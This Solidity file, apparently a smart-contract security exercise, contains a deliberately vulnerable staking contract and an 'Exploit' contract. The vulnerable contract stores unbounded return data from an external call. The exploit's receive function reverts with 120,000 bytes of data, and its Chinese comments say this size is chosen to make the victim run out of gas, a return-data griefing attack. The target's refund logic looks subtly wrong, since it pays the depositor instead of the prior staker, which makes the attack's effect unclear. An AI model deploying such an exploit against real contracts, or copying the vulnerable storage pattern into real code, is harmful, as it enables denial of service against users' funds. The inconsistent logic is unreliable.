pragma solidity 0.8.19;


import "./RewardToken.sol";


contract IStaking {
    RewardToken rewardToken;

    uint256 constant AMOUNT = 1 ether;
    uint256 constant GASLIMIT = 50000;
    uint256 EMISSION = 0.2e18; // 0.2 tokens per second

    address public currentStaker;
    uint256 public lastClaim;

    bytes debugInfo;

    event CallResults(bytes err);

    constructor() {
        rewardToken = new RewardToken();
    }

    function deposit() external payable {
        require(msg.value == AMOUNT, "missing amount of ether");

        if(currentStaker != address(0)) {
            _claim();
            (bool success, bytes memory data) = 
                payable(msg.sender).call{gas: GASLIMIT, value: AMOUNT}("");

            debugInfo = data;
        }

        lastClaim = block.timestamp;
        currentStaker = msg.sender;
    }

    function withdraw() external {
        require(msg.sender == currentStaker, "not a current staker");
        currentStaker = address(0);
    }

    function claim() public {
        require(currentStaker != address(0), "no current staker"); 
        _claim();
    }

    function _claim() private {
        uint256 duration = block.timestamp - lastClaim;
        lastClaim = block.timestamp;

        uint256 rewards = duration * EMISSION;
        rewardToken.mint(currentStaker, rewards);
    }
}


contract Exploit {
    IStaking staking;
    uint256 count = 0;

    constructor(address stakingAddress) payable {
        staking = IStaking(stakingAddress);
    }

    function attack() external {
        staking.deposit{value: 1 ether}();
        
    }
    
    receive() external payable {
        assembly {
            // 选择一个不会让本回调先 OOG，但足以让对方在存储时 OOG 的长度
            // 例如 120_000 字节（~3750 个 32B 槽；对方落库需 ~75,000,000 gas）
            let len := 120000
            // 内存默认是零填充的，直接从 0 开始回滚即可
            revert(0, len)
        }
    }
}

